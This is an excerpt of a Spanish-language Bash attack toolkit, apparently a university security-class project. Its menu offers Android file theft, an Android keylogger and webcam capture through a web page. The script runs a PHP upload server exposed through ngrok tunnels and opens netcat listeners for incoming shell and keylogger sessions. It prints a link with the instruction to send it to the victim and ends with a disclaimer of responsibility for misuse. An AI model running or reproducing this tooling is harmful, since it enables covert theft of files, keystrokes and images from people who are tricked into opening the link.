...
readonly requirements=("curl" "php" "xterm" "zenity")
readonly pathsdk=1
...
function ngrok_start() {
  if [[ $code -eq 1 ]]; then
    pkill -f ngrok
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Iniciando Ngrok..\n"
    xterm -T " Iniciando Ngrok " -geometry 100x25-1+0 -e "ngrok http 4444" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Por favor espere..\n"
    sleep 10;
    ...
    pkill -f ngrok
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Iniciando Ngrok..\n"
    xterm -T " Iniciando Ngrok " -geometry 100x25-1+0 -e "ngrok tcp $port" & > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Por favor espere..\n"
    sleep 10;
...
function php_start() {
  if [[ $PHP = 1 ]]
  then
    ############## < start php Android Archivos > ##############
    pkill -f php
    cp -rf PHP/upload.php .;
    echo "post_max_size = 800M" > php.ini
    xterm -T " Waiting Files " -geometry 100x25+1+0 -e "php -c php.ini -S 127.0.0.1:4444" & > /dev/null 2>&1
  ...
  then
    ...
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Iniciando servidor Php...\n"
    sleep 2
  else
...
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Waiting Files,\e[0m\e[1;77m Press Ctrl + C Para salir...\e[0m\n"
...
case "$choose_dir1" in
  ...
  *)
    ...
    then
      ...
      printf "\e[1;77m\e[38;5;154m[\e[38;5;15m+\e[38;5;154m]\e[38;5;51m Android Archivos\e[0m\n"; configureApp_gf;
    fi ;;
esac
done
}
...
xterm -T " Console Shell & Keylogger " -geometry 100x30+1+0 -e "nc -lvp 4444" & > /dev/null 2>&1
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m ## cat /storage/emulated/0/Android/data/com.abifog.lokiboard/files/lokiboard_files_02_06_2021.txt\n";sleep 1
...
while [[ true ]]
do
  printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Waiting Sessions,\e[0m\e[1;77m Press Ctrl + C Para salir...\e[0m\n"
  nc -lvp $port  
...
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Por favor espere..\e[0m\n"
...
php_start
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link_ngrok
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[1;77m\e[38;5;154m Esperando objetivos,\e[0m\e[1;77m Press Ctrl + C Para salir...\e[0m\n"
if [[ ! -d webcam ]]; then
  mkdir webcam
fi
...
printf "\n\e[0m\e[1;77m--------------------< Tomar foto por html >--------------------\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m] \e[0m\e[38;5;154mINICIAR HTML\e[0m\n"


while [[ $custom_template != "" ]]; do
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m digite (0) cero para continuar or (\e[1;77m\e[38;5;154mHit Enter to Default\e[0m): \e[0m' custom_template
...
printf """< HERRAMIENTA > 
        --- By: Kp300\n
"""
printf "  \e[0m\e[101m\e[1;77m:: SEGURIDAD INFORMATICA - UNIGUGUAJIRA    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: DOCENTE: LUIS ANGEL MENDOZA::\e[0m\n"
printf "  \e[101m\e[1;77m:: NOTA: No somos responsables de su mal uso::\e[0m\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Android Archivos\e[0m\e[38;5;51m\t{\e[38;5;154m Obtener archivos y carpetas android\e[38;5;51m}\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Android Keylogger\e[0m\e[38;5;51m\t{\e[38;5;154m Android Keylogger \e[38;5;51m}\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93mTomar Foto\e[0m\e[38;5;51m\t{\e[38;5;154m Tomar fotos pagina web\e[38;5;51m}\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Quit\e[0m\e[38;5;51m\t\t{\e[38;5;154msalir\e[38;5;51m}\e[0m\e[0m\n\n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77mEligir opcion 1-2-3\e[0m: ' choose_number
